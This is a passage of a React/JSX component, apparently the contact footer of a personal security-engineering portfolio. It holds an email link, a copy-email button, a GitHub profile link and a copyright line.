            <p className="text-sm text-zinc-400 leading-relaxed">
              Available for advanced security collaborations, systems engineering discussions, and academic research inquiries.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-3">
            <a 
              href="mailto:kidakabadiop2010@gmail.com"
              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs tracking-wide transition-all shadow-lg shadow-emerald-500/20"
            >
              <Mail className="w-4 h-4" />
              <span>kidakabadiop2010@gmail.com</span>
            </a>

            <button
              onClick={() => copyToClipboard('kidakabadiop2010@gmail.com', 'email')}
              className="inline-flex items-center gap-1.5 px-4 py-2.5 rounded-full bg-zinc-800 hover:bg-zinc-700 text-zinc-300 font-mono text-xs transition-colors border border-white/10"
            >
              {copiedKey === 'email' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copiedKey === 'email' ? 'Copied' : 'Copy Email'}</span>
            </button>

            <a 
              href="https://github.com/blah-blah-cell"
              target="_blank"
              rel="noreferrer"
              className="inline-flex items-center gap-2 px-4 py-2.5 rounded-full bg-zinc-800 hover:bg-zinc-700 text-zinc-300 font-mono text-xs transition-colors border border-white/10"
            >
              <GithubIcon className="w-4 h-4" />
              <span>@blah-blah-cell</span>
              <ArrowUpRight className="w-3 h-3 text-zinc-500" />
            </a>
          </div>

          <div className="pt-4 border-t border-zinc-800/80 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 text-xs font-mono text-zinc-500">
            <div>© 2026 Ojas Mehta. Engineered from first principles.</div>
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500" />
              <span>PGP // SUBMISSION ENCRYPTED</span>
            </div>
          </div>
        </section>
      </main>
    </div>
  );
}
